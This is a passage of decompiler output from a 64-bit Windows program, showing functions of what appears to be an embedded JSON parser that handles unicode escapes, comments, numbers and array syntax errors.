  sub_140029730((__int64)&v21, v9, v28, 2);
  v10 = std::basic_istream<char,std::char_traits<char>>::operator>>(&v20, &v17);
  if ( *(_BYTE *)(*(signed int *)(*(_QWORD *)v10 + 4i64) + v10 + 16) & 6 )
  {
    v11 = *(_BYTE **)(v4 + 16);
    v12 = *(_BYTE **)(v4 + 8);
    v26 = 15i64;
    v25 = 0i64;
    LOBYTE(v24) = 0;
    if ( v12 != v11 )
      sub_140004F20(&v24, v12, v11 - v12);
    v13 = sub_14004C790(&v30, "'", (size_t *)&v24);
    v14 = (void **)sub_14000DAC0(&v33, v13, "' is not a number.");
    v15 = sub_14006F8A0(v5, v14, v4, 0i64);
    if ( v35 >= 0x10 )
      operator delete(v33);
    v35 = 15i64;
    v34 = 0i64;
    LOBYTE(v33) = 0;
    if ( v32 >= 0x10 )
      operator delete(v30);
    v32 = 15i64;
    v31 = 0i64;
    LOBYTE(v30) = 0;
    if ( v26 >= 0x10 )
      operator delete(v24);
  }
  else
  {
    sub_14006BCF0((__int64)&v24, v17);
    sub_14006BFB0(v3);
    sub_14006BF10((__int64)&v24);
    v15 = 1;
  }
  *(signed int **)((char *)&v20 + v20[1]) = (signed int *)&off_1400AEE38;
  *(_DWORD *)((char *)&v19 + v20[1] + 4) = v20[1] - 144;
  sub_140023CD0((__int64)&v21);
  std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(&v22);
  std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(&v23);
  if ( v29 >= 0x10 )
    operator delete(Dst);
  return v15;
}
// 1400A14E0: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::operator>>(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A1678: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(_QWORD);
// 1400A1680: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::basic_istream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1690: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);
// 1400AEE38: using guessed type __int64 (__fastcall *off_1400AEE38)();

//----- (000000014006FEB0) ----------------------------------------------------
__int64 __fastcall sub_14006FEB0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 *v3; // rdi
  unsigned __int8 v4; // bl
  _QWORD *v5; // rax
  _QWORD *v6; // rax
  _QWORD *v7; // rdx
  char v9; // [rsp+28h] [rbp-50h]
  char v10; // [rsp+40h] [rbp-38h]
  char v11; // [rsp+58h] [rbp-20h]

  v2 = a2;
  v3 = a1;
  sub_14006BD10((__int64)&v9, 0);
  if ( (unsigned __int8)sub_14006FF70(v3, v2, &v9) )
  {
    v5 = sub_140070CD0(v3, &v10);
    v6 = sub_1400687B0((__int64)v5, &v11, 1i64);
    v7 = (_QWORD *)*v6;
    if ( *v6 )
      v7 = (_QWORD *)*v7;
    sub_14006F1F0(
      *(__int64 **)(*(_QWORD *)(v7[1] + 8 * ((v6[2] >> 1) & (v7[2] - 1i64))) + 8 * (v6[2] & 1i64)),
      (__int64 *)&v9);
    v4 = 1;
  }
  else
  {
    v4 = 0;
  }
  sub_14006BF10((__int64)&v9);
  return v4;
}
// 14006FF70: using guessed type __int64 __fastcall sub_14006FF70(_QWORD, _QWORD, _QWORD);

//----- (00000001400700E0) ----------------------------------------------------
__int64 __fastcall sub_1400700E0(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rdi
  __int64 v3; // rbx
  _QWORD *v4; // rax
  __int64 **v5; // rax
  char v7; // [rsp+28h] [rbp-80h]
  char v8; // [rsp+40h] [rbp-68h]
  char v9; // [rsp+58h] [rbp-50h]
  void *v10; // [rsp+70h] [rbp-38h]
  __int64 v11; // [rsp+80h] [rbp-28h]
  unsigned __int64 v12; // [rsp+88h] [rbp-20h]

  v2 = a1;
  v12 = 15i64;
  v3 = 0i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( (unsigned __int8)sub_1400701E0(a1, a2, &v10) )
  {
    sub_14006BC80((__int64)&v7, &v10);
    v4 = sub_140070CD0(v2, &v8);
    v5 = (__int64 **)sub_1400687B0((__int64)v4, &v9, 1i64);
    if ( *v5 )
      v3 = **v5;
    sub_14006F1F0(
      *(__int64 **)(*(_QWORD *)(*(_QWORD *)(v3 + 8)
                              + 8 * (((unsigned __int64)v5[2] >> 1) & (*(_QWORD *)(v3 + 16) - 1i64)))
                  + 8 * ((unsigned __int64)v5[2] & 1)),
      (__int64 *)&v7);
    LOBYTE(v3) = 1;
    sub_14006BF10((__int64)&v7);
  }
  if ( v12 >= 0x10 )
    operator delete(v10);
  return (unsigned __int8)v3;
}
// 1400701E0: using guessed type __int64 __fastcall sub_1400701E0(_QWORD, _QWORD, _QWORD);

//----- (0000000140070970) ----------------------------------------------------
char __fastcall sub_140070970(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, int *a5)
{
  __int64 v5; // r14
  __int64 *v6; // rbx
  __int64 v7; // rbp
  __int64 v8; // rsi
  char *v10; // rcx
  char v11; // bl
  char v12; // al
  char *v13; // rdx
  char v14; // cl
  int v15; // [rsp+30h] [rbp-68h]
  __int64 v16; // [rsp+38h] [rbp-60h]
  void *Dst; // [rsp+40h] [rbp-58h]
  __int64 v18; // [rsp+50h] [rbp-48h]
  unsigned __int64 v19; // [rsp+58h] [rbp-40h]

  v16 = -2i64;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( !sub_140070B00(a1, a2, a3, a4, a5) )
    return 0;
  if ( (unsigned int)(*a5 - 55296) > 0x3FF )
    return 1;
  v10 = (char *)*v6;
  if ( v5 - *v6 >= 6 )
  {
    v12 = *v10;
    v13 = v10 + 1;
    *v6 = (__int64)(v10 + 1);
    if ( v12 != 92 || (v14 = *v13, *v6 = (__int64)(v13 + 1), v14 != 117) )
    {
      v19 = 15i64;
      v18 = 0i64;
      LOBYTE(Dst) = 0;
      sub_140004F20(&Dst, "expecting another \\u token to begin the second half of a unicode surrogate pair", 0x4Fui64);
      v11 = sub_14006F8A0(v8, &Dst, v7, *v6);
      goto LABEL_6;
    }
    if ( !sub_140070B00(v8, v7, v6, v5, &v15) )
      return 0;
    *a5 = (v15 & 0x3FF) + (((*a5 & 0x3FF) + 64) << 10);
    return 1;
  }
  v19 = 15i64;
  v18 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, "additional six characters expected to parse unicode surrogate pair.", 0x43ui64);
  v11 = sub_14006F8A0(v8, &Dst, v7, *v6);
LABEL_6:
  if ( v19 >= 0x10 )
    operator delete(Dst);
  return v11;
}

//----- (0000000140070B00) ----------------------------------------------------
char __fastcall sub_140070B00(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, int *a5)
{
  __int64 *v5; // rbx
  __int64 v6; // rsi
  __int64 v7; // r14
  char v8; // bl
  int v10; // er8
  char v11; // al
  int v12; // edx
  int v13; // ecx
  int v14; // eax
  __int64 v15; // rbx
  __int128 v16; // [rsp+30h] [rbp-31h]
  __int64 v17; // [rsp+40h] [rbp-21h]
  void *Dst; // [rsp+48h] [rbp-19h]
  __int64 v19; // [rsp+58h] [rbp-9h]
  unsigned __int64 v20; // [rsp+60h] [rbp-1h]
  __int64 v21; // [rsp+68h] [rbp+7h]
  void *v22; // [rsp+70h] [rbp+Fh]
  __int64 v23; // [rsp+80h] [rbp+1Fh]
  unsigned __int64 v24; // [rsp+88h] [rbp+27h]

  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( a4 - *a3 < 4 )
  {
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(v22) = 0;
    sub_140004F20(&v22, "Bad unicode escape sequence in string: four digits expected.", 0x3Cui64);
    v8 = sub_14006F8A0(v7, &v22, v6, *v5);
    if ( v24 >= 0x10 )
      operator delete(v22);
    return v8;
  }
  *a5 = 0;
  v10 = 0;
  while ( 1 )
  {
    v11 = *(_BYTE *)(*v5)++;
    v12 = 16 * *a5;
    *a5 = v12;
    if ( (unsigned __int8)(v11 - 48) > 9u )
      break;
    v13 = v11;
    v14 = v12 - 48;
LABEL_12:
    *a5 = v13 + v14;
    if ( ++v10 >= 4 )
      return 1;
  }
  if ( (unsigned __int8)(v11 - 97) <= 5u )
  {
    v13 = v11;
    v14 = v12 - 87;
    goto LABEL_12;
  }
  if ( (unsigned __int8)(v11 - 65) <= 5u )
  {
    v13 = v11;
    v14 = v12 - 55;
    goto LABEL_12;
  }
  v24 = 15i64;
  v23 = 0i64;
  LOBYTE(v22) = 0;
  sub_140004F20(&v22, "Bad unicode escape sequence in string: hexadecimal digit expected.", 0x42ui64);
  v15 = *v5;
  v20 = 15i64;
  v19 = 0i64;
  LOBYTE(Dst) = 0;
  v16 = *(_OWORD *)v6;
  v17 = *(_QWORD *)(v6 + 16);
  sub_140004DF0(&Dst, &v22, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v21 = v15;
  sub_140071150((_QWORD *)(v7 + 40), (__int64)&v16);
  if ( v20 >= 0x10 )
    operator delete(Dst);
  if ( v24 >= 0x10 )
    operator delete(v22);
  return 0;
}

//----- (0000000140070CD0) ----------------------------------------------------
_QWORD *__fastcall sub_140070CD0(__int64 *a1, _QWORD *a2)
{
  __int64 v2; // rax
  __int64 v3; // r8
  __int64 v4; // r8
  _QWORD *result; // rax

  v2 = *a1;
  v3 = a1[4];
  a2[1] = 0i64;
  v4 = a1[3] + v3;
  *a2 = v2;
  result = a2;
  a2[2] = v4;
  return result;
}

//----- (0000000140070CF0) ----------------------------------------------------
_QWORD *__fastcall sub_140070CF0(void *Src, char *a2, char *a3)
{
  char *v3; // r14
  char *v4; // rsi
  _QWORD *v5; // rbx
  unsigned __int64 v6; // rdx
  _BYTE *v7; // rax
  char v8; // bp
  size_t v9; // r8
  unsigned __int64 v10; // rdi
  unsigned __int64 v11; // rax
  _QWORD *v12; // rax
  size_t v13; // r8
  _BYTE *v14; // rax
  _QWORD *v15; // rax
  _QWORD *v16; // rax

  v3 = a3;
  v4 = a2;
  v5 = Src;
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  v6 = a3 - a2;
  if ( ((unsigned __int64)(a3 - v4) > 0 || a3 == v4)
    && *((_QWORD *)Src + 3) != v6
    && sub_1400049C0((size_t *)Src, v6, 1) )
  {
    v5[2] = 0i64;
    if ( v5[3] < 0x10ui64 )
      v7 = v5;
    else
      v7 = (_BYTE *)*v5;
    *v7 = 0;
  }
  while ( v4 != v3 )
  {
    v8 = *v4++;
    if ( v8 == 13 )
    {
      if ( v4 != v3 && *v4 == 10 )
        ++v4;
      v9 = v5[2];
      if ( -1i64 - v9 <= 1 )
        goto LABEL_43;
      v10 = v9 + 1;
      if ( v9 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
LABEL_43:
        std::_Xlength_error("string too long");
        __debugbreak();
LABEL_44:
        std::_Xlength_error("string too long");
        __debugbreak();
LABEL_45:
        std::_Xlength_error("string too long");
        __debugbreak();
        return v5;
      }
      v11 = v5[3];
      if ( v11 >= v10 )
      {
        if ( v9 != -1i64 )
          goto LABEL_20;
LABEL_29:
        v5[2] = 0i64;
        if ( v11 < 0x10 )
          v14 = v5;
        else
          v14 = (_BYTE *)*v5;
        *v14 = 0;
      }
      else
      {
        sub_140004790(v5, v9 + 1, v9);
        if ( v10 )
        {
LABEL_20:
          if ( v5[3] < 0x10ui64 )
            v12 = v5;
          else
            v12 = (_QWORD *)*v5;
          *((_BYTE *)v12 + v5[2]) = 10;
          goto LABEL_38;
        }
      }
    }
    else
    {
      v13 = v5[2];
      if ( -1i64 - v13 <= 1 )
        goto LABEL_45;
      v10 = v13 + 1;
      if ( v13 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
        goto LABEL_44;
      v11 = v5[3];
      if ( v11 >= v10 )
      {
        if ( v13 == -1i64 )
          goto LABEL_29;
LABEL_34:
        if ( v5[3] < 0x10ui64 )
          v15 = v5;
        else
          v15 = (_QWORD *)*v5;
        *((_BYTE *)v15 + v5[2]) = v8;
LABEL_38:
        v5[2] = v10;
        if ( v5[3] < 0x10ui64 )
          v16 = v5;
        else
          v16 = (_QWORD *)*v5;
        *((_BYTE *)v16 + v10) = 0;
      }
      else
      {
        sub_140004790(v5, v13 + 1, v13);
        if ( v10 )
          goto LABEL_34;
      }
    }
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140070EE0) ----------------------------------------------------
char __fastcall sub_140070EE0(__int64 a1, _QWORD *a2, __int64 a3, char a4)
{
  _QWORD *v4; // rbx
  char v5; // si
  __int64 v6; // rbp
  __int64 v7; // rdi

  v4 = (_QWORD *)(a1 + 80);
  v5 = a4;
  v6 = a3;
  v7 = a1;
  if ( (_QWORD *)(a1 + 80) != a2 )
    sub_140004DF0((void *)(a1 + 80), a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v4[3] >= 0x10ui64 )
    v4 = (_QWORD *)*v4;
  return sub_140070F50(v7, (__int64)v4, (__int64)v4 + *(_QWORD *)(v7 + 96), v6, v5);
}

//----- (0000000140070F50) ----------------------------------------------------
char __fastcall sub_140070F50(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5)
{
  __int64 v5; // rdi
  __int64 v6; // r12
  __int64 v7; // r15
  __int64 v8; // rbx
  char v9; // al
  __int64 v10; // rax
  char v11; // si
  __int128 v13; // [rsp+20h] [rbp-91h]
  __int64 v14; // [rsp+30h] [rbp-81h]
  __int64 v15; // [rsp+38h] [rbp-79h]
  __int64 v16; // [rsp+40h] [rbp-71h]
  __int128 v17; // [rsp+50h] [rbp-61h]
  __int64 v18; // [rsp+60h] [rbp-51h]
  void *Dst; // [rsp+68h] [rbp-49h]
  __int64 v20; // [rsp+78h] [rbp-39h]
  unsigned __int64 v21; // [rsp+80h] [rbp-31h]
  __int64 v22; // [rsp+88h] [rbp-29h]
  void *v23; // [rsp+90h] [rbp-21h]
  __int64 v24; // [rsp+A0h] [rbp-11h]
  unsigned __int64 v25; // [rsp+A8h] [rbp-9h]

  v16 = -2i64;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  v15 = a4;
  v9 = a5;
  if ( !*(_BYTE *)(a1 + 184) )
    v9 = 0;
  *(_QWORD *)(a1 + 112) = a2;
  *(_QWORD *)(a1 + 120) = a3;
  *(_BYTE *)(a1 + 186) = v9;
  *(_QWORD *)(a1 + 128) = a2;
  *(_QWORD *)(a1 + 136) = 0i64;
  *(_QWORD *)(a1 + 144) = 0i64;
  sub_140004F20((void *)(a1 + 152), byte_1400A3400, 0i64);
  sub_140007D70((_QWORD *)(v8 + 40));
  if ( *(_QWORD *)(v8 + 32) )
  {
    v10 = *(_QWORD *)(v8 + 32);
    do
    {
      if ( !--v10 )
        *(_QWORD *)(v8 + 24) = 0i64;
    }
    while ( v10 );
    *(_QWORD *)(v8 + 32) = 0i64;
  }
  sub_14006A7D0(v8, &v15);
  dword_1400DBD98 = 0;
  v11 = sub_1400720D0(v8);
  sub_1400724B0(v8, (__int64)&v13);
  if ( *(_BYTE *)(v8 + 186) && *(_QWORD *)(v8 + 168) )
    sub_14006F040(v5, (__int64 *)(v8 + 152), 2);
  if ( !*(_BYTE *)(v8 + 185) || sub_14006E810(v5) || sub_14006E900(v5) )
    return v11;
  LODWORD(v13) = 13;
  *((_QWORD *)&v13 + 1) = v7;
  v14 = v6;
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(v23) = 0;
  sub_140004F20(&v23, "A valid JSON document must be either an array or an object value.", 0x41ui64);
  v21 = 15i64;
  v20 = 0i64;
  LOBYTE(Dst) = 0;
  v17 = v13;
  v18 = v14;
  sub_140004DF0(&Dst, &v23, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v22 = 0i64;
  sub_140071150((_QWORD *)(v8 + 40), (__int64)&v17);
  if ( v21 >= 0x10 )
    operator delete(Dst);
  if ( v25 >= 0x10 )
    operator delete(v23);
  return 0;
}
// 1400720D0: using guessed type __int64 __fastcall sub_1400720D0(_QWORD);
// 1400DBD98: using guessed type int dword_1400DBD98;

//----- (0000000140071150) ----------------------------------------------------
__int64 __fastcall sub_140071150(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rsi
  _QWORD *v3; // rbx
  signed __int64 v4; // r8
  signed __int64 v5; // rdi
  void *v6; // rcx
  __int64 result; // rax
  __int64 v8; // rdi
  signed __int64 v9; // rcx

  v2 = a2;
  v3 = a1;
  if ( a1[2] <= (unsigned __int64)(a1[4] + 1i64) )
    sub_14006F660(a1, 1ui64);
  v4 = v3[2] - 1i64;
  v3[3] &= v4;
  v5 = 8 * ((v3[4] + v3[3]) & v4);
  if ( !*(_QWORD *)(v5 + v3[1]) )
  {
    v6 = operator new(0x40ui64);
    if ( !v6 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
    *(_QWORD *)(v5 + v3[1]) = v6;
  }
  result = v3[1];
  v8 = *(_QWORD *)(v5 + result);
  if ( v8 )
  {
    *(_OWORD *)v8 = *(_OWORD *)v2;
    *(_QWORD *)(v8 + 16) = *(_QWORD *)(v2 + 16);
    v9 = v8 + 24;
    *(_QWORD *)(v9 + 24) = 15i64;
    *(_QWORD *)(v9 + 16) = 0i64;
    *(_BYTE *)v9 = 0;
    sub_140004DF0((void *)(v8 + 24), (_QWORD *)(v2 + 24), 0i64, 0xFFFFFFFFFFFFFFFFui64);
    result = *(_QWORD *)(v2 + 56);
    *(_QWORD *)(v8 + 56) = result;
  }
  ++v3[4];
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140071240) ----------------------------------------------------
__int64 __fastcall sub_140071240(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  __int64 **v3; // rax
  __int64 v4; // rdx
  unsigned __int8 *v5; // rdx
  signed __int64 v6; // r8
  unsigned __int8 *v7; // rcx
  unsigned __int64 v8; // rax
  unsigned __int8 v9; // bl
  signed int v10; // er15
  __int64 v11; // rax
  signed __int64 v12; // r14
  __int64 v13; // rdx
  __int64 v14; // rdx
  unsigned __int64 v15; // rdi
  signed __int64 v16; // rsi
  void *v17; // rax
  signed __int64 *v18; // rcx
  char v19; // al
  bool v20; // zf
  char v21; // al
  int i; // ecx
  bool v23; // dl
  __int64 v24; // rdi
  __int128 v26; // [rsp+0h] [rbp-79h]
  __int64 v27; // [rsp+10h] [rbp-69h]
  char v28; // [rsp+18h] [rbp-61h]
  __int64 v29; // [rsp+30h] [rbp-49h]
  __int128 v30; // [rsp+40h] [rbp-39h]
  __int64 v31; // [rsp+50h] [rbp-29h]
  void *Dst; // [rsp+58h] [rbp-21h]
  __int64 v33; // [rsp+68h] [rbp-11h]
  unsigned __int64 v34; // [rsp+70h] [rbp-9h]
  __int64 v35; // [rsp+78h] [rbp-1h]
  void *v36; // [rsp+80h] [rbp+7h]
  __int64 v37; // [rsp+90h] [rbp+17h]
  unsigned __int64 v38; // [rsp+98h] [rbp+1Fh]

  v29 = -2i64;
  v1 = a1;
  sub_14006BD10((__int64)&v30, 6);
  v2 = sub_140070CD0((__int64 *)v1, &v26);
  v3 = (__int64 **)sub_1400687B0((__int64)v2, &v36, 1i64);
  if ( *v3 )
    v4 = **v3;
  else
    v4 = 0i64;
  sub_14006F1F0(
    *(__int64 **)(*(_QWORD *)(*(_QWORD *)(v4 + 8) + 8 * (((unsigned __int64)v3[2] >> 1) & (*(_QWORD *)(v4 + 16) - 1i64)))
                + 8 * ((unsigned __int64)v3[2] & 1)),
    (__int64 *)&v28);
  v5 = *(unsigned __int8 **)(v1 + 120);
  if ( *(unsigned __int8 **)(v1 + 128) != v5 )
  {
    v6 = 4294977024i64;
    do
    {
      v7 = *(unsigned __int8 **)(v1 + 128);
      v8 = *v7;
      if ( (unsigned __int8)v8 > 0x20u )
        break;
      if ( !_bittest64(&v6, v8) )
        break;
      *(_QWORD *)(v1 + 128) = v7 + 1;
    }
    while ( v7 + 1 != v5 );
  }
  if ( **(_BYTE **)(v1 + 128) == 93 )
  {
    sub_140071DB0(v1, (__int64)&v36);
LABEL_11:
    v9 = 1;
    goto LABEL_46;
  }
  v10 = 0;
  while ( 1 )
  {
    v11 = std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::back(v1);
    v12 = sub_14006C0F0(v11, v10++);
    v13 = *(_QWORD *)(v1 + 32);
    if ( !(((_BYTE)v13 + *(_BYTE *)(v1 + 24)) & 1) && *(_QWORD *)(v1 + 16) <= (unsigned __int64)(v13 + 2) >> 1 )
      sub_140069110((_QWORD *)v1, 1ui64);
    v14 = *(_QWORD *)(v1 + 16);
    *(_QWORD *)(v1 + 24) &= 2 * v14 - 1;
    v15 = *(_QWORD *)(v1 + 32) + *(_QWORD *)(v1 + 24);
    v16 = 8 * ((v15 >> 1) & (v14 - 1));
    if ( !*(_QWORD *)(v16 + *(_QWORD *)(v1 + 8)) )
      break;
LABEL_19:
    v18 = (signed __int64 *)(*(_QWORD *)(*(_QWORD *)(v1 + 8) + v16) + 8 * (v15 & 1));
    if ( v18 )
      *v18 = v12;
    ++*(_QWORD *)(v1 + 32);
    v19 = sub_1400720D0(v1);
    v20 = (*(_QWORD *)(v1 + 32))-- == 1i64;
    if ( v20 )
      *(_QWORD *)(v1 + 24) = 0i64;
    if ( !v19 )
    {
      v9 = sub_140072390(v1, 4);
      goto LABEL_46;
    }
    v21 = sub_140071DB0(v1, (__int64)&v26);
    for ( i = v26; (_DWORD)v26 == 12; i = v26 )
    {
      if ( !v21 )
        break;
      v21 = sub_140071DB0(v1, (__int64)&v26);
    }
    v23 = i != 10 && i != 4;
    if ( !v21 || v23 )
      goto LABEL_36;
    if ( i == 4 )
      goto LABEL_11;
  }
  v17 = operator new(0x10ui64);
  if ( v17 )
  {
    *(_QWORD *)(v16 + *(_QWORD *)(v1 + 8)) = v17;
    goto LABEL_19;
  }
  std::_Xbad_alloc();
  __debugbreak();
LABEL_36:
  v38 = 15i64;
  v37 = 0i64;
  LOBYTE(v36) = 0;
  sub_140004F20(&v36, "Missing ',' or ']' in array declaration", 0x27ui64);
  v34 = 15i64;
  v33 = 0i64;
  LOBYTE(Dst) = 0;
  v30 = v26;
  v31 = v27;
  sub_140004DF0(&Dst, &v36, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v35 = 0i64;
  sub_140071150((_QWORD *)(v1 + 40), (__int64)&v30);
  if ( v34 >= 0x10 )
    operator delete(Dst);
  v34 = 15i64;
  v33 = 0i64;
  LOBYTE(Dst) = 0;
  v24 = *(_QWORD *)(v1 + 72);
  do
  {
    if ( !sub_140071DB0(v1, (__int64)&v26) )
      sub_140072400((_QWORD *)(v1 + 40), (signed int)v24);
  }
  while ( (_DWORD)v26 != 4 && (_DWORD)v26 );
  sub_140072400((_QWORD *)(v1 + 40), (signed int)v24);
  v9 = 0;
  if ( v38 >= 0x10 )
    operator delete(v36);
LABEL_46:
  sub_14006BF10((__int64)&v28);
  return v9;
}
// 14006FB90: using guessed type __int64 __fastcall std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::back(_QWORD);
// 1400720D0: using guessed type __int64 __fastcall sub_1400720D0(_QWORD);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140071590) ----------------------------------------------------
char __fastcall sub_140071590(__int64 a1)
{
  char *v1; // rdx
  char *v2; // r8
  char *v3; // r11
  char v4; // r9
  char *v5; // rdx
  char v6; // al
  char *v7; // rax
  char v8; // dl
  bool i; // zf
  char v11; // al
  char *v12; // rax
  int v13; // er10
  unsigned __int64 v14; // r9
  char *v15; // rax

  v1 = *(char **)(a1 + 128);
  v2 = *(char **)(a1 + 120);
  v3 = v1 - 1;
  if ( v1 == v2 )
    return 0;
  v4 = *v1;
  v5 = v1 + 1;
  *(_QWORD *)(a1 + 128) = v5;
  if ( v4 != 42 )
  {
    if ( v4 == 47 )
    {
      for ( i = v5 == v2; !i; i = *(_QWORD *)(a1 + 128) == (_QWORD)v2 )
      {
        if ( v5 != v2 )
        {
          v11 = *v5++;
          *(_QWORD *)(a1 + 128) = v5;
          if ( v11 == 10 )
            goto LABEL_23;
          if ( v11 == 13 )
          {
            if ( v5 != v2 && *v5 == 10 )
              *(_QWORD *)(a1 + 128) = v5 + 1;
            goto LABEL_23;
          }
        }
      }
      goto LABEL_23;
    }
    return 0;
  }
  if ( v5 != v2 )
  {
    do
    {
      if ( v5 != v2 )
      {
        v6 = *v5++;
        *(_QWORD *)(a1 + 128) = v5;
        if ( v6 == 42 && *v5 == 47 )
          break;
      }
    }
    while ( *(char **)(a1 + 128) != v2 );
  }
  v7 = *(char **)(a1 + 128);
  if ( v7 == v2 )
  {
    v8 = 0;
  }
  else
  {
    v8 = *v7;
    *(_QWORD *)(a1 + 128) = v7 + 1;
  }
  if ( v8 != 47 )
    return 0;
LABEL_23:
  if ( *(_BYTE *)(a1 + 186) )
  {
    v12 = *(char **)(a1 + 136);
    v13 = 0;
    if ( v12 )
    {
      if ( v12 >= v3 )
      {
LABEL_29:
        if ( v4 != 42 || (v14 = *(_QWORD *)(a1 + 128), v15 = v3, (unsigned __int64)v3 >= v14) )
        {
LABEL_34:
          v13 = 1;
        }
        else
        {
          while ( *v15 != 10 && *v15 != 13 )
          {
            if ( (unsigned __int64)++v15 >= v14 )
              goto LABEL_34;
          }
        }
      }
      else
      {
        while ( *v12 != 10 && *v12 != 13 )
        {
          if ( ++v12 >= v3 )
            goto LABEL_29;
        }
      }
    }
    sub_14006F810(a1, v3, *(char **)(a1 + 128), v13);
  }
  return 1;
}

//----- (00000001400716E0) ----------------------------------------------------
char *__fastcall sub_1400716E0(__int64 a1)
{
  char *result; // rax
  __int64 v2; // r8
  char i; // dl
  unsigned __int64 v4; // rcx
  unsigned __int64 v5; // r9
  char v6; // dl

  result = *(char **)(a1 + 128);
  v2 = a1;
  i = 48;
  do
  {
    if ( i > 57 )
      break;
    *(_QWORD *)(a1 + 128) = result;
    if ( (unsigned __int64)result >= *(_QWORD *)(a1 + 120) )
      return result;
    i = *result++;
  }
  while ( i >= 48 );
  if ( i == 46 )
  {
    *(_QWORD *)(a1 + 128) = result;
    v4 = *(_QWORD *)(a1 + 120);
    if ( (unsigned __int64)result >= v4 )
      return result;
    for ( i = *result++; i >= 48; i = *result++ )
    {
      if ( i > 57 )
        break;
      *(_QWORD *)(v2 + 128) = result;
      if ( (unsigned __int64)result >= v4 )
        return result;
    }
  }
  if ( !((i - 69) & 0xDF) )
  {
    v5 = *(_QWORD *)(v2 + 120);
    *(_QWORD *)(v2 + 128) = result;
    if ( (unsigned __int64)result < v5 )
    {
      v6 = *result++;
      if ( !((v6 - 43) & 0xFD) )
      {
        *(_QWORD *)(v2 + 128) = result;
        if ( (unsigned __int64)result >= v5 )
          return result;
        v6 = *result++;
      }
      for ( ; v6 >= 48; v6 = *result++ )
      {
        if ( v6 > 57 )
          break;
        *(_QWORD *)(v2 + 128) = result;
        if ( (unsigned __int64)result >= v5 )
          break;
      }
    }
  }
  return result;
}

//----- (00000001400717B0) ----------------------------------------------------
__int64 __fastcall sub_1400717B0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  __int64 **v3; // rax
  __int64 v4; // rdx
  char v5; // al
  int v6; // edi
  char v7; // al
  __int64 v8; // rcx
  __int64 v9; // rax
  signed __int64 v10; // r14
  __int64 v11; // rdx
  __int64 v12; // rdx
  unsigned __int64 v13; // rdi
  signed __int64 v14; // rsi
  void *v15; // rax
  signed __int64 *v16; // rax
  char v17; // al
  bool v18; // zf
  int v19; // ecx
  char i; // al
  unsigned __int8 v21; // bl
  __int64 v22; // rdi
  __int64 v23; // rdi
  __int64 v24; // rdi
  __int128 v26; // [rsp+20h] [rbp-C8h]
  __int64 v27; // [rsp+30h] [rbp-B8h]
  __int64 v28; // [rsp+38h] [rbp-B0h]
  char v29; // [rsp+40h] [rbp-A8h]
  __int128 v30; // [rsp+60h] [rbp-88h]
  __int64 v31; // [rsp+70h] [rbp-78h]
  void *Dst; // [rsp+78h] [rbp-70h]
  __int64 v33; // [rsp+80h] [rbp-68h]
  void *v34[2]; // [rsp+88h] [rbp-60h]
  __int64 v35; // [rsp+98h] [rbp-50h]
  unsigned __int64 v36; // [rsp+A0h] [rbp-48h]
  void *v37[2]; // [rsp+A8h] [rbp-40h]
  __int64 v38; // [rsp+B8h] [rbp-30h]
  unsigned __int64 v39; // [rsp+C0h] [rbp-28h]
  void *v40; // [rsp+C8h] [rbp-20h]
  __int64 v41; // [rsp+D8h] [rbp-10h]
  unsigned __int64 v42; // [rsp+E0h] [rbp-8h]

  v28 = -2i64;
  v1 = a1;
  v42 = 15i64;
  v41 = 0i64;
  LOBYTE(v40) = 0;
  sub_14006BD10((__int64)&v29, 7);
  v2 = sub_140070CD0((__int64 *)v1, &v26);
  v3 = (__int64 **)sub_1400687B0((__int64)v2, v34, 1i64);
  if ( *v3 )
    v4 = **v3;
  else
    v4 = 0i64;
  sub_14006F1F0(
